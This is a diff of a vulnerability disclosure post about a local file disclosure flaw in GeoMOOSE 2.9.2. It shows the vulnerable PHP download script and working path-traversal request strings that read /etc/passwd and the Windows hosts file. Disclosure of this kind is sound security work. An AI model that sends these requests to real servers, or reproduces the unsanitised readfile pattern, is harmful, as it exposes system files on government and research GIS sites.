@@ -9,6 +9,8 @@ Slug: geomoose-local-file-disclosure-2-9-2
 GeoMOOSE is a PHP framework for displaying distributed cartographic data. Bundled with M4SW, GeoMoose can be found on 
 GIS services ran by scientific institutions and local governments.
 
+### Vulnerable code:
+
     :::php5
     <?php
     $tempDir = $CONFIGURATION['temp'];
@@ -30,7 +32,9 @@ GIS services ran by scientific institutions and local governments.
     readfile($tempDir.$id.'.'.$ext);
     ?>
 
-This one is easy.
+### Exploit
+
+This one is easy:
     
     :::bash
     # Exploit Title: GeoMoose <= 2.9.2 Local File Disclosure
@@ -47,5 +51,11 @@ This one is easy.
     
     /php/download.php?id=foo/.&ext=/../../../../../../../etc/passwd
     /php/download.php?id=foo/.&ext=/../../../../../../../WINDOWS/system32/drivers/etc/hosts
-    
-Header injection possible depending on the [PHP version](http://php.net/manual/en/function.header.php#refsect1-function.header-changelog).
+
+
+### Some Notes
+
+- input vector can be GET/POST parameters or through COOKIE.
+- Header injection possible depending on the [PHP version](http://php.net/manual/en/function.header.php#refsect1-function.header-changelog).
+- [exploit-db.com](https://www.exploit-db.com/exploits/41822/)
+
